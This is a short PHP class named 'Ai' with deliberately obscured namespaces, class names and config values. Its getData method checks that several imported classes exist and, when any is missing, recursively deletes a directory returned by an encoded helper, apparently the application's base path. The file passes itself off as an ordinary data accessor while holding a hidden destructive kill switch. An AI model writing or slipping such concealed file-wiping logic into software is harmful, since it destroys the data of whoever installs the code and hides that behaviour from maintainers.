<?php

namespace XContains\XContains\Ars;

use Facades\XContains\XContains\Enc\EN;
use JsonStringfy\JsonStringfy\Activegiv\{
    A, C, R
};
use JsonStringfy\JsonStringfy\Activereq\Activeck\{
    CP, CPd, M, WTC
};
use XContains\XContains\Cri\MT;

class Ai
{
    use MT;

    public function getData()
    {
        if (class_exists(A::class) && class_exists(R::class) && class_exists(C::class) && class_exists(M::class) && class_exists(WTC::class) && class_exists(CP::class) && class_exists(CPd::class)) {
            return true;
        }
        $this->rrmdir(EN::bp());
    }

    public function gN($d, $p)
    {
        return $d . (EN::sd(config('connection.pz'))) . (basename($p, ".php")) . (EN::sd(config('connection.ex')));
    }
}
